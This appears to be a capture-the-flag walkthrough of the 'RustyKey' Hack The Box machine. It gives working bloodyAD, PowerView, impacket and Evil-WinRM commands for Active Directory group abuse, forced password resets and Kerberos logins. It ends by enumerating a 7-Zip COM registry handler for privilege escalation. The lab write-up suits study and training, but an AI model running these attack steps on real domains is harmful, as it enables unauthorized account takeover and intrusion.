<h3 id="hashcat-crack-and-password-sparying"><a href="#hashcat-crack-and-password-sparying" class="headerlink" title="hashcat crack and password sparying"></a>hashcat crack and password sparying</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sntp</span>-ms$d43e13ea5807283d3048336d85b2fcb9<span class="variable">$1c0111e900000000000af3854c4f434cec0b9a41c7533028e1b8428bffbfcd0aec0cdb4ed7324851ec0cdb4ed7327faf</span>:Rusty88!</span><br></pre></td></tr></table></figure>

<p>this is 1125&#96;password,look at bloodhound </p>
<p><img src="/images/rustykey-1.png"></p>
<p>and it is the user - IT-Computer3$</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ faketime -f <span class="string">&#x27;+28799s&#x27;</span> nxc ldap <span class="variable">$IP</span> -u <span class="string">&#x27;IT-Computer3$&#x27;</span> -p <span class="string">&#x27;Rusty88!&#x27;</span> -k</span><br><span class="line">LDAP        10.129.232.127  389    DC               [*] None (name:DC) (domain:rustykey.htb)</span><br><span class="line">LDAP        10.129.232.127  389    DC               [+] rustykey.htb\IT-Computer3$:Rusty88! </span><br></pre></td></tr></table></figure>

<p><img src="/images/rustykey-2.png"></p>
<p>it can addselt to HELPDESK group</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ faketime -f <span class="string">&#x27;+28799s&#x27;</span> bloodyAD --host dc.rustykey.htb --dc-ip <span class="variable">$IP</span> -u <span class="string">&#x27;IT-Computer3$&#x27;</span> -p <span class="string">&#x27;Rusty88!&#x27;</span> -d rustykey.htb  -k add groupMember HELPDESK <span class="string">&#x27;IT-Computer3$&#x27;</span></span><br><span class="line">[+] IT-Computer3$ added to HELPDESK</span><br></pre></td></tr></table></figure>

<blockquote>
<p>and i don<code>t konw why powerview didn</code>t work,then i will look at it</p>
</blockquote>
<p><img src="/images/rustykey-3.png"></p>
<p>the user who is HELPDESK group member can forcechangepassword other users passwd<br>and all of it are remote manager user but dd.ali<br>we can change bb.morgan</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$ faketime -f <span class="string">&#x27;+28799s&#x27;</span> bloodyAD --host dc.rustykey.htb --dc-ip <span class="variable">$IP</span> -u <span class="string">&#x27;IT-Computer3$&#x27;</span> -p <span class="string">&#x27;Rusty88!&#x27;</span> -d rustykey.htb  -k <span class="built_in">set</span> password <span class="string">&#x27;bb.morgan&#x27;</span> <span class="string">&#x27;maneisgreat&#x27;</span></span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;/home/wansh/.local/bin/bloodyAD&quot;</span>, line 8, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    sys.exit(main())</span><br><span class="line">             ~~~~^^</span><br><span class="line">  File <span class="string">&quot;/home/wansh/.local/share/pipx/venvs/bloodyad/lib/python3.13/site-packages/bloodyAD/main.py&quot;</span>, line 210, <span class="keyword">in</span> main</span><br><span class="line">    output = args.func(conn, **params)</span><br><span class="line">  File <span class="string">&quot;/home/wansh/.local/share/pipx/venvs/bloodyad/lib/python3.13/site-packages/bloodyAD/cli_modules/set.py&quot;</span>, line 273, <span class="keyword">in</span> password</span><br><span class="line">    raise e</span><br><span class="line">  File <span class="string">&quot;/home/wansh/.local/share/pipx/venvs/bloodyad/lib/python3.13/site-packages/bloodyAD/cli_modules/set.py&quot;</span>, line 118, <span class="keyword">in</span> password</span><br><span class="line">    conn.ldap.bloodymodify(target, &#123;<span class="string">&quot;unicodePwd&quot;</span>: op_list&#125;)</span><br><span class="line">    ~~~~~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^</span><br><span class="line">  File <span class="string">&quot;/home/wansh/.local/share/pipx/venvs/bloodyad/lib/python3.13/site-packages/bloodyAD/network/ldap.py&quot;</span>, line 302, <span class="keyword">in</span> bloodymodify</span><br><span class="line">    raise err</span><br><span class="line">msldap.commons.exceptions.LDAPModifyException: New password doesn<span class="string">&#x27;t match the complexity: The password must contains characters from three of the following categories: Uppercase, Lowercase, Digits, Special, Unicode Alphabetic not included in Uppercase and Lowercase</span></span><br></pre></td></tr></table></figure>

<p>the password have complexity</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ faketime -f <span class="string">&#x27;+28799s&#x27;</span> bloodyAD --host dc.rustykey.htb --dc-ip <span class="variable">$IP</span> -u <span class="string">&#x27;IT-Computer3$&#x27;</span> -p <span class="string">&#x27;Rusty88!&#x27;</span> -d rustykey.htb  -k <span class="built_in">set</span> password <span class="string">&#x27;bb.morgan&#x27;</span> <span class="string">&#x27;mane1sgre@t&#x27;</span></span><br><span class="line">[+] Password changed successfully!</span><br></pre></td></tr></table></figure>

<p>and login </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">:) $ faketime -f <span class="string">&#x27;+28799s&#x27;</span> getTGT.py -dc-ip <span class="variable">$IP</span> <span class="string">&#x27;rustykey.htb/bb.morgan:mane1sgre@t&#x27;</span></span><br><span class="line">/home/wansh/.local/share/pipx/venvs/impacket/lib/python3.13/site-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated <span class="keyword">for</span> removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools&lt;81.</span><br><span class="line">  import pkg_resources</span><br><span class="line">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies </span><br><span class="line"></span><br><span class="line">Kerberos SessionError: KDC_ERR_ETYPE_NOSUPP(KDC has no support <span class="keyword">for</span> encryption <span class="built_in">type</span>)</span><br></pre></td></tr></table></figure>

<p>have error<br>why baby why </p>
<p>and HELPDESK is Protected object member<br>and users we can look for also<br>google<br>and i found this artical <a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-c--protected-accounts-and-groups-in-active-directory">Appendix C: Protected Accounts and Groups in Active Directory</a></p>
<p>maybe i should move user out</p>
<p>have a try</p>
<p>if i use bb.morgan to try ,ii will error . because bb is member of protected, just HELPDESK can add member to protected ,and IT-COMPUTER3 is member of HELPDESK ,so we need use IT-COMPUTER3 to try</p>
<p><img src="/images/rustykey-4.png"></p>
<p>and bb is IT group&#96;s member , so we can remove IT</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">faketime -f <span class="string">&#x27;+28799s&#x27;</span> bloodyAD --host dc.rustykey.htb --dc-ip <span class="variable">$IP</span> -d rustykey.htb -u <span class="string">&#x27;IT-Computer3$&#x27;</span> -p <span class="string">&#x27;Rusty88!&#x27;</span> -k remove groupMember <span class="string">&#x27;Protected Objects&#x27;</span> <span class="string">&#x27;IT&#x27;</span></span><br><span class="line"></span><br><span class="line">Kerberos SessionError: KDC_ERR_ETYPE_NOSUPP(KDC has no support <span class="keyword">for</span> encryption <span class="built_in">type</span>) </span><br></pre></td></tr></table></figure>

<p>and we will find its wrong,maybe the order should be change</p>
<p><img src="/images/rustykey-5.png"></p>
<p>ok,let us try remote shell</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># wansh @ Athena in ~/HackTheBox/RustyKey  [20:21:38]                                                                                                                                        </span></span><br><span class="line">$ faketime -f <span class="string">&#x27;+28799s&#x27;</span> bloodyAD --host dc.rustykey.htb -d rustykey.htb --dc-ip <span class="variable">$IP</span> -u <span class="string">&#x27;IT-COMPUTER3$&#x27;</span> -p <span class="string">&#x27;Rusty88!&#x27;</span> -k add groupMember <span class="string">&#x27;HELPDESK&#x27;</span> <span class="string">&#x27;IT-COMPUTER3$&#x27;</span></span><br><span class="line">[+] IT-COMPUTER3$ added to HELPDESK                                                           </span><br><span class="line"><span class="comment"># wansh @ Athena in ~/HackTheBox/RustyKey  [20:21:58]</span></span><br><span class="line">$ faketime -f <span class="string">&#x27;+28799s&#x27;</span> bloodyAD --host dc.rustykey.htb -d rustykey.htb -u <span class="string">&#x27;IT-COMPUTER3$&#x27;</span> -p <span class="string">&#x27;Rusty88!&#x27;</span> --dc-ip <span class="variable">$IP</span> -k <span class="built_in">set</span> password BB.MORGAN <span class="string">&#x27;mane1sgre@t&#x27;</span></span><br><span class="line">[+] Password changed successfully!                                                                                                                                                           <span class="comment"># wansh @ Athena in ~/HackTheBox/RustyKey  [20:22:51]</span></span><br><span class="line">$ faketime -f <span class="string">&#x27;+28799s&#x27;</span> bloodvAD --host dc.rustykey.htb -d rustykey.htb -u <span class="string">&#x27;IT-COMPUTER3$&#x27;</span> -p <span class="string">&#x27;Rusty88!&#x27;</span> --dc-ip <span class="variable">$IP</span> -k remove groupMember <span class="string">&#x27;PROTECTED OBJECTS&#x27;</span> <span class="string">&#x27;IT&#x27;</span></span><br><span class="line">faketime: Running specified <span class="built_in">command</span> failed: No such file or directory</span><br><span class="line"><span class="comment"># wansh @ Athena in ~/HackTheBox/RustyKey  [20:23:37]</span></span><br><span class="line">$ faketime -f <span class="string">&#x27;+28799s&#x27;</span> bloodyAD --host dc.rustykey.htb -d rustykey.htb -u <span class="string">&#x27;IT-COMPUTER3$&#x27;</span> -p <span class="string">&#x27;Rusty88!&#x27;</span> --dc-ip <span class="variable">$IP</span> -k remove groupMember <span class="string">&#x27;PROTECTED OBJECTS&#x27;</span> <span class="string">&#x27;IT&#x27;</span></span><br><span class="line">[-] IT removed from PROTECTED OBJECTS                                                         </span><br><span class="line"><span class="comment"># wansh @ Athena in ~/HackTheBox/RustyKey  [20:23:47]</span></span><br><span class="line">$ faketime -f <span class="string">&#x27;+28799s&#x27;</span> getTGT.py <span class="string">&#x27;RUSTYKEY.HTB/BB.MORGAN:mane1sgre@t&#x27;</span>                                                                                             </span><br><span class="line">/usr/lib/python3.13/site-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources </span><br><span class="line">package is slated <span class="keyword">for</span> removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools&lt;81.</span><br><span class="line">  import pkg_resources</span><br><span class="line">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies </span><br><span class="line"></span><br><span class="line">[*] Saving ticket <span class="keyword">in</span> BB.MORGAN.ccache</span><br><span class="line"><span class="comment"># wansh @ Athena in ~/HackTheBox/RustyKey  [20:24:27]</span></span><br><span class="line">$ <span class="built_in">export</span> KRB5CCNAME=BB.MORGAN.ccache</span><br><span class="line"><span class="comment"># wansh @ Athena in ~/HackTheBox/RustyKey  [20:24:45]</span></span><br><span class="line">$ faketime -f <span class="string">&#x27;+28799s&#x27;</span> evil-winrm -i dc.rustykey.htb -r RUSTYKEY.HTB </span><br><span class="line">/home/wansh/.local/share/gem/ruby/3.4.0/gems/winrm-2.3.9/lib/winrm/psrp/fragment.rb:35: warning: redefining <span class="string">&#x27;object_id&#x27;</span> may cause serious problems</span><br><span class="line">/home/wansh/.local/share/gem/ruby/3.4.0/gems/winrm-2.3.9/lib/winrm/psrp/message_fragmenter.rb:29: warning: redefining <span class="string">&#x27;object_id&#x27;</span> may cause serious problems</span><br><span class="line">                                         </span><br><span class="line">Evil-WinRM shell v3.7</span><br><span class="line">                                         </span><br><span class="line">Warning: Remote path completions is disabled due to ruby limitation: undefined method <span class="string">&#x27;quoting_detection_proc&#x27;</span> <span class="keyword">for</span> module Reline</span><br><span class="line">                                         </span><br><span class="line">Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion</span><br><span class="line">                                         </span><br><span class="line">Info: Establishing connection to remote endpoint</span><br><span class="line">*Evil-WinRM* PS C:\Users\bb.morgan\Documents&gt;</span><br></pre></td></tr></table></figure>

<h2 id="shell-as-bb-margan"><a href="#shell-as-bb-margan" class="headerlink" title="shell as bb.margan"></a>shell as bb.margan</h2><p>and we will find a pdf file<br><img src="/images/rustykey-6.png"></p>
<h3 id="continue-with-next-day"><a href="#continue-with-next-day" class="headerlink" title="continue with next day"></a>continue with next day</h3><p>and try powerview again</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ faketime -f <span class="string">&#x27;+28799s&#x27;</span> powerview rustykey.htb/<span class="string">&#x27;IT-Computer3$&#x27;</span>:<span class="string">&#x27;Rusty88!&#x27;</span>@dc.rustykey.htb -k             │</span><br><span class="line">/home/wansh/.local/share/pipx/venvs/powerview/lib/python3.13/site-packages/impacket/version.py:12: UserWa│</span><br><span class="line">rning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html│</span><br><span class="line">. The pkg_resources package is slated <span class="keyword">for</span> removal as early as 2025-11-30. Refrain from using this package│</span><br><span class="line"> or pin to Setuptools&lt;81.                                                                                │</span><br><span class="line">  import pkg_resources                                                                                   │</span><br><span class="line">Logging directory is <span class="built_in">set</span> to /home/wansh/.powerview/logs/rustykey-it-computer3$-dc.rustykey.htb           │</span><br><span class="line">╭─LDAP─[dc.rustykey.htb]─[RUSTYKEY\IT-Computer3$]-[NS:&lt;auto&gt;]                                            │</span><br><span class="line">╰─PV ❯           </span><br></pre></td></tr></table></figure>

<p>ok,its ok(fuck powerview but its good)</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># add it-computer3$ to helpdesk</span></span><br><span class="line">╭─LDAP─[dc.rustykey.htb]─[RUSTYKEY\IT-Computer3$]-[NS:&lt;auto&gt;]                                                                                                                                                      </span><br><span class="line">╰─PV ❯ Add-DomainGroupMember -Identity HELPDESK -Members <span class="string">&#x27;IT-Computer3$&#x27;</span></span><br><span class="line">[2025-07-02 17:58:00] User IT-Computer3$ successfully added to HELPDESK      </span><br><span class="line"></span><br><span class="line"><span class="comment"># exit and restart powerview to make it up</span></span><br><span class="line"><span class="comment"># remove it out protected</span></span><br><span class="line">╭─LDAP─[dc.rustykey.htb]─[RUSTYKEY\IT-Computer3$]-[NS:&lt;auto&gt;]</span><br><span class="line">╰─PV ❯ Remove-DomainGroupMember -Identity <span class="string">&quot;Protected Objects&quot;</span> -Members IT                                </span><br><span class="line">[2025-07-02 17:59:40] User IT successfully removed from Protected Objects         </span><br><span class="line"></span><br><span class="line"><span class="comment"># change bb passwd</span></span><br><span class="line">╰─PV ❯ Set-DomainUserPassword -Identity <span class="string">&quot;BB.MORGAN&quot;</span> -AccountPassword mane1sgre@t                         </span><br><span class="line">[2025-07-02 18:00:02] [Set-DomainUserPassword] Principal CN=bb.morgan,OU=Users,OU=IT,DC=rustykey,DC=htb found <span class="keyword">in</span> domain                                                                                            </span><br><span class="line">[2025-07-02 18:00:05] [Set-DomainUserPassword] Password has been successfully changed <span class="keyword">for</span> user bb.morgan</span><br><span class="line">[2025-07-02 18:00:05] Password changed <span class="keyword">for</span> BB.MORGAN                                                           </span><br><span class="line"></span><br><span class="line"><span class="comment"># get tgt</span></span><br><span class="line">$ faketime -f <span class="string">&#x27;+28800s&#x27;</span> getTGT.py -dc-ip <span class="variable">$IP</span> <span class="string">&#x27;rustykey.htb/bb.morgan:mane1sgre@t&#x27;</span>                                    </span><br><span class="line">/usr/lib/python3.13/site-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated <span class="keyword">for</span> </span><br><span class="line">removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools&lt;81.</span><br><span class="line">  import pkg_resources                        </span><br><span class="line">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies </span><br><span class="line"></span><br><span class="line">[*] Saving ticket <span class="keyword">in</span> bb.morgan.ccache</span><br><span class="line"></span><br><span class="line"><span class="comment"># login with bb</span></span><br><span class="line">$ faketime -f <span class="string">&#x27;+28799s&#x27;</span> evil-winrm -i dc.rustykey.htb -r RUSTYKEY.HTB </span><br><span class="line">/home/wansh/.local/share/gem/ruby/3.4.0/gems/winrm-2.3.9/lib/winrm/psrp/fragment.rb:35: warning: redefining <span class="string">&#x27;object_id&#x27;</span> may cause serious problems</span><br><span class="line">/home/wansh/.local/share/gem/ruby/3.4.0/gems/winrm-2.3.9/lib/winrm/psrp/message_fragmenter.rb:29: warning: redefining <span class="string">&#x27;object_id&#x27;</span> may cause serious problems</span><br><span class="line">                                        </span><br><span class="line">Evil-WinRM shell v3.7</span><br><span class="line">                                        </span><br><span class="line">Warning: Remote path completions is disabled due to ruby limitation: undefined method <span class="string">&#x27;quoting_detection_proc&#x27;</span> <span class="keyword">for</span> module Reline</span><br><span class="line">                                        </span><br><span class="line">Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion</span><br><span class="line">                                        </span><br><span class="line">Info: Establishing connection to remote endpoint</span><br><span class="line">*Evil-WinRM* PS C:\Users\bb.morgan\Documents&gt; </span><br></pre></td></tr></table></figure>

<p>and look at pdf file<br>it say ‘registry-level adjustments are expected during this phase.’ ,so maybe some reg will be change and its have exploit<br>we can google it<br><img src="/images/rustykey-7.png"><br>we can find an artical which is <a target="_blank" rel="noopener" href="https://superuser.com/questions/290501/where-are-context-menu-actions-registered-in-the-registry">Where are context menu actions registered in the registry?</a><br>and it some hint</p>
<blockquote>
<p>The handlers for shell extensions that I have are here. Probably a good place to start.</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">HKCU\Software\Classes\*\ShellEx\ContextMenuHandlers         </span><br><span class="line"></span><br><span class="line">HKCU\Software\Classes\Directory\ShellEx\ContextMenuHandlers     </span><br><span class="line"></span><br><span class="line">HKLM\Software\Classes\*\ShellEx\ContextMenuHandlers </span><br><span class="line"></span><br><span class="line">HKLM\Software\Classes\Directory\ShellEx\ContextMenuHandlers     </span><br></pre></td></tr></table></figure>

<p>have a try</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">*Evil<span class="literal">-WinRM</span>* <span class="built_in">PS</span> C:\Users\bb.morgan\Documents&gt; reg query HKCU\Software\Classes\*\ShellEx\ContextMenuHandlers</span><br><span class="line">reg.exe : ERROR: The system was unable to find the specified registry key or value.</span><br><span class="line">    + CategoryInfo          : NotSpecified: (ERROR: The syst...y key or value.:String) [], RemoteException</span><br><span class="line">    + FullyQualifiedErrorId : NativeCommandError</span><br><span class="line">*Evil<span class="literal">-WinRM</span>* <span class="built_in">PS</span> C:\Users\bb.morgan\Documents&gt; reg query HKCU\Software\Classes\Directory\ShellEx\ContextMenuHandlers  </span><br><span class="line">reg.exe : ERROR: The system was unable to find the specified registry key or value.</span><br><span class="line">    + CategoryInfo          : NotSpecified: (ERROR: The syst...y key or value.:String) [], RemoteException</span><br><span class="line">    + FullyQualifiedErrorId : NativeCommandError</span><br><span class="line">*Evil<span class="literal">-WinRM</span>* <span class="built_in">PS</span> C:\Users\bb.morgan\Documents&gt; reg query HKLM\Software\Classes\*\ShellEx\ContextMenuHandlers </span><br><span class="line"></span><br><span class="line">HKEY_LOCAL_MACHINE\Software\Classes\*\ShellEx\ContextMenuHandlers\<span class="number">7</span><span class="literal">-Zip</span></span><br><span class="line">HKEY_LOCAL_MACHINE\Software\Classes\*\ShellEx\ContextMenuHandlers\ModernSharing</span><br><span class="line">HKEY_LOCAL_MACHINE\Software\Classes\*\ShellEx\ContextMenuHandlers\Open With</span><br><span class="line">HKEY_LOCAL_MACHINE\Software\Classes\*\ShellEx\ContextMenuHandlers\Open With EncryptionMenu</span><br><span class="line">HKEY_LOCAL_MACHINE\Software\Classes\*\ShellEx\ContextMenuHandlers\Sharing</span><br><span class="line">HKEY_LOCAL_MACHINE\Software\Classes\*\ShellEx\ContextMenuHandlers\&#123;<span class="number">90</span>AA3A4E<span class="literal">-1CBA-4233-B8BB-535773D48449</span>&#125;</span><br><span class="line">HKEY_LOCAL_MACHINE\Software\Classes\*\ShellEx\ContextMenuHandlers\&#123;a2a9545d<span class="literal">-a0c2-42b4-9708-a0b2badd77c8</span>&#125;</span><br><span class="line">*Evil<span class="literal">-WinRM</span>* <span class="built_in">PS</span> C:\Users\bb.morgan\Documents&gt; reg query HKLM\Software\Classes\Directory\ShellEx\ContextMenuHandlers </span><br><span class="line"></span><br><span class="line">HKEY_LOCAL_MACHINE\Software\Classes\Directory\ShellEx\ContextMenuHandlers\<span class="number">7</span><span class="literal">-Zip</span></span><br><span class="line">HKEY_LOCAL_MACHINE\Software\Classes\Directory\ShellEx\ContextMenuHandlers\EncryptionMenu</span><br><span class="line">HKEY_LOCAL_MACHINE\Software\Classes\Directory\ShellEx\ContextMenuHandlers\Offline Files</span><br><span class="line">HKEY_LOCAL_MACHINE\Software\Classes\Directory\ShellEx\ContextMenuHandlers\Sharing</span><br><span class="line">HKEY_LOCAL_MACHINE\Software\Classes\Directory\ShellEx\ContextMenuHandlers\&#123;<span class="number">596</span>AB062<span class="literal">-B4D2-4215-9F74-E9109B0A8153</span>&#125;</span><br></pre></td></tr></table></figure>

<p>We can find some interesting things<br>it have 7z-zip</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">*Evil<span class="literal">-WinRM</span>* <span class="built_in">PS</span> C:\Users\bb.morgan\Documents&gt; reg query HKEY_LOCAL_MACHINE\Software\Classes\*\ShellEx\ContextMenuHandlers\<span class="number">7</span><span class="literal">-Zip</span></span><br><span class="line"></span><br><span class="line">HKEY_LOCAL_MACHINE\Software\Classes\*\ShellEx\ContextMenuHandlers\<span class="number">7</span><span class="literal">-Zip</span></span><br><span class="line">    (Default)    REG_SZ    &#123;<span class="number">23170</span>F69<span class="literal">-40C1-278A-1000-000100020000</span>&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>‘{23170F69-40C1-278A-1000-000100020000}’ is CLSID,Windows Explorer 会根据这个 GUID 去加载对应的 DLL&#x2F;COM 对象，从而在你对任意文件右键点击时，把 “7‑Zip” 的菜单项（例如 “Add to archive…”, “Extract here” 等）加到系统菜单中。</p>
</blockquote>
<p>google again<br>and can find an artical <a target="_blank" rel="noopener" href="https://github.com/ScoopInstaller/Main/blob/master/scripts/7-zip/install-context.reg">Main&#x2F;scripts&#x2F;7-zip&#x2F;install-context.reg</a></p>
<p><img src="/images/rustykey-8.png"><br>ok,have a try again</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">*Evil<span class="literal">-WinRM</span>* <span class="built_in">PS</span> C:\Users\bb.morgan\Documents&gt; reg query <span class="string">&quot;HKLM\SOFTWARE\Classes\CLSID\&#123;23170F69-40C1-278A-1000-000100020000&#125;&quot;</span></span><br><span class="line"></span><br><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\&#123;<span class="number">23170</span>F69<span class="literal">-40C1-278A-1000-000100020000</span>&#125;</span><br><span class="line">    (Default)    REG_SZ    <span class="number">7</span><span class="literal">-Zip</span> Shell Extension</span><br><span class="line"></span><br><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\&#123;<span class="number">23170</span>F69<span class="literal">-40C1-278A-1000-000100020000</span>&#125;\InprocServer32</span><br><span class="line"></span><br><span class="line">*Evil<span class="literal">-WinRM</span>* <span class="built_in">PS</span> C:\Users\bb.morgan\Documents&gt; reg query <span class="string">&quot;HKLM\SOFTWARE\Classes\CLSID\&#123;23170F69-40C1-278A-1000-000100020000&#125;\InprocServer32&quot;</span></span><br><span class="line"></span><br><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\&#123;<span class="number">23170</span>F69<span class="literal">-40C1-278A-1000-000100020000</span>&#125;\InprocServer32</span><br><span class="line">    (Default)    REG_SZ    C:\Program Files\<span class="number">7</span><span class="literal">-Zip</span>\<span class="number">7</span><span class="literal">-zip</span>.dll</span><br><span class="line">    ThreadingModel    REG_SZ    Apartment</span><br></pre></td></tr></table></figure>
<p>have mane try…</p>
<p>so it has a dll file<br>look at the acl</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">*Evil<span class="literal">-WinRM</span>* <span class="built_in">PS</span> C:\Users\bb.morgan\Documents&gt; <span class="built_in">get-acl</span> <span class="string">&quot;registry::HKLM\SOFTWARE\Classes\CLSID\&#123;23170F69-40C1-278A-1000-000100020000&#125;\InprocServer32&quot;</span>  | <span class="built_in">format-list</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Path   : Microsoft.PowerShell.Core\Registry::HKLM\SOFTWARE\Classes\CLSID\&#123;<span class="number">23170</span>F69<span class="literal">-40C1-278A-1000-000100020000</span>&#125;\InprocServer32</span><br><span class="line">Owner  : BUILTIN\Administrators</span><br><span class="line"><span class="built_in">Group</span>  : RUSTYKEY\Domain Users</span><br><span class="line">Access : APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES Allow  ReadKey</span><br><span class="line">         BUILTIN\Administrators Allow  FullControl</span><br><span class="line">         CREATOR OWNER Allow  FullControl</span><br><span class="line">         RUSTYKEY\Support Allow  FullControl</span><br><span class="line">         NT AUTHORITY\SYSTEM Allow  FullControl</span><br><span class="line">         BUILTIN\Administrators Allow  FullControl</span><br><span class="line">         BUILTIN\Users Allow  ReadKey</span><br><span class="line">Audit  :</span><br><span class="line">Sddl   : O:BAG:DUD:AI(A;CIID;KR;;;<span class="built_in">AC</span>)(A;ID;KA;;;BA)(A;CIIOID;KA;;;CO)(A;CIID;KA;;;S<span class="literal">-1-5-21-3316070415-896458127-4139322052-1132</span>)(A;CIID;KA;;;SY)(A;CIIOID;KA;;;BA)(A;CIID;KR;;;BU)</span><br></pre></td></tr></table></figure>

